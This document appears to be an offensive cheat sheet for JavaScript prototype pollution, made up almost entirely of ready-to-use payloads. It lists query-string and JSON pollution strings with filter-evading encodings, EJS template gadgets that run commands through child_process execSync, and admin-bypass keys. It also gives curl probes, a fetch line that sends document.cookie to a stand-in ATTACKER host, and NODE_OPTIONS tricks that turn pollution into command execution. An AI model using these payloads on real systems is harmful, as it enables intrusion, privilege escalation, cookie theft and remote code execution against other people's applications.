# Prototype Pollution

## Try

```text
?__proto__[polluted]=1
?constructor[prototype][polluted]=1
?prototype[polluted]=1
?__proto__.polluted=1
?constructor.prototype.polluted=1
```

```json
{"__proto__":{"polluted":"1"}}
{"constructor":{"prototype":{"polluted":"1"}}}
{"prototype":{"polluted":"1"}}
{"a":{"__proto__":{"polluted":"1"}}}
{"a":[{"__proto__":{"polluted":"1"}}]}
```

Check if it sticks:

```text
polluted
[object Object]
true
admin
```

Server-side JS check:

```js
({}).polluted
Object.prototype.polluted
```

## Sources

Common parsers / merge points:

```text
qs / express extended query parser
lodash merge / defaultsDeep / set
jquery extend(true, ...)
hoek merge
deepmerge
merge-recursive
dot-prop / object-path
YAML or JSON config merge
GraphQL variables merged into defaults
```

Payload encodings:

```text
__proto__[x]=1
constructor[prototype][x]=1
__proto__.x=1
constructor.prototype.x=1
%5f%5fproto%5f%5f[x]=1
__pr%6fto__[x]=1
```

## URL Param Gadgets

```text
?name=a&__proto__[debug]=true
?name=a&__proto__[debug_url]=https://ATTACKER/x.js
?name=a&constructor[prototype][debug]=true
?__proto__[isAdmin]=true
?__proto__[role]=admin
?__proto__[authenticated]=true
?__proto__[allowDots]=true
?__proto__[body][type]=Program
```

## Template Gadgets

```json
{"__proto__":{"client":true}}
{"__proto__":{"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').execSync('id')"}}
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');x"}}
```

EJS / Express query-style:

```text
settings[view options][client]=true
settings[view options][escapeFunction]=JSON.stringify;process.mainModule.require('child_process').execSync('id')
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');x
__proto__[client]=true
__proto__[escapeFunction]=JSON.stringify;process.mainModule.require('child_process').execSync('id')
__proto__[outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');x
```

Pug / Handlebars config names to inspect when polluted config reaches templates:

```text
compileDebug
self
filename
basedir
helpers
partials
```

## Access-Control Gadgets

Try keys that match app authorization logic:

```json
{"__proto__":{"admin":true}}
{"__proto__":{"isAdmin":true}}
{"__proto__":{"role":"admin"}}
{"__proto__":{"roles":["admin"]}}
{"__proto__":{"authenticated":true}}
{"__proto__":{"canDelete":true}}
{"__proto__":{"owner":true}}
```

Debug/config gadgets:

```json
{"__proto__":{"debug":true}}
{"__proto__":{"verbose":true}}
{"__proto__":{"env":"development"}}
{"__proto__":{"NODE_ENV":"development"}}
{"__proto__":{"json spaces":2}}
```

## Express / qs Checks

```bash
curl 'http://HOST/?__proto__[x]=1'
curl 'http://HOST/?constructor[prototype][x]=1'
curl 'http://HOST/?__proto__.x=1'
curl -X POST http://HOST/ -H 'Content-Type: application/json' -d '{"__proto__":{"x":"1"}}'
curl -X POST http://HOST/ -H 'Content-Type: application/x-www-form-urlencoded' -d '__proto__[x]=1'
curl -X POST http://HOST/ -H 'Content-Type: application/x-www-form-urlencoded' -d 'constructor[prototype][x]=1'
```

## Client Side

```html
<script src="https://ATTACKER/x.js"></script>
```

```js
fetch('https://ATTACKER/?c=' + encodeURIComponent(document.cookie))
```

Client-side pollution keys to try:

```text
?__proto__[src]=https://ATTACKER/x.js
?__proto__[url]=https://ATTACKER/x.js
?__proto__[scriptUrl]=https://ATTACKER/x.js
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[html]=<img src=x onerror=alert(1)>
?__proto__[sanitize]=false
?__proto__[isAdmin]=true
```

Common sinks:

```js
element.innerHTML = config.html
script.src = config.src
fetch(config.url)
if (user.isAdmin) showAdmin()
Object.assign(defaults, userInput)
```

## Pollution To Command Execution

If pollution reaches `child_process` options:

```json
{"__proto__":{"shell":"/bin/sh"}}
{"__proto__":{"argv0":"sh"}}
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/pwn.js"}}}
```

If app later writes a controlled JS file and spawns `node`, polluted `NODE_OPTIONS=--require /path/file.js` can execute it.

## Cleanup / Verification

Pollution can persist in a running Node process. Re-test with a fresh process if results become confusing.

```text
1. Send pollution.
2. Hit a separate endpoint that uses defaults/config.
3. Check if a clean request now behaves differently.
4. Restart service to clear Object.prototype pollution.
```
